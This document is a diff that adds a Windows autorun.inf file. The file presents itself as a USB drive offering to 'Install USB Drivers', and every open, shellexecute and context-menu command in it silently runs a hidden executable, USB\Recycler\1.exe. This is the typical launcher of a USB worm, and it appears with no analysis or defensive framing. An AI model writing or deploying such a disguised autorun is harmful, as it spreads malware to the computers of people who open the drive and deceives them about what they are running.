@@ -1,0 +1,9 @@
+[autorun]
+label=Usb Drive
+open=USB\Recycler\1.exe
+action=Install Usb Drivers
+shellexecute="cmd" /C USB\Recycler\1.exe
+shell\U3=Open
+shell\U3\command=USB\Recycler\1.exe
+shell\USB=Install USB Drivers
+shell\USB\command=USB\Recycler\1.exe
